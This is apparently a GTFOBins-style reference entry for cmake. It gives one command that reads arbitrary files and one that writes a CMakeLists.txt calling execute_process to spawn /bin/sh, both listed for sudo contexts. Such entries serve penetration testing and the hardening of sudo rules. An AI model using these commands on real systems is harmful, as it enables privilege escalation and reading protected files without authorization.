---
type: gtfobin
name: cmake
platform: Unix
functions: [file-read, shell]
tags: [gtfobin, unix, lotl]
---

# cmake

## file-read

```bash
cmake -E cat /path/to/input-file
```
**Contexts:** sudo, unprivileged

## shell

```bash
echo 'execute_process(COMMAND /bin/sh)' >/path/to/CMakeLists.txt
cmake /path/to/
```
**Contexts:** sudo, unprivileged
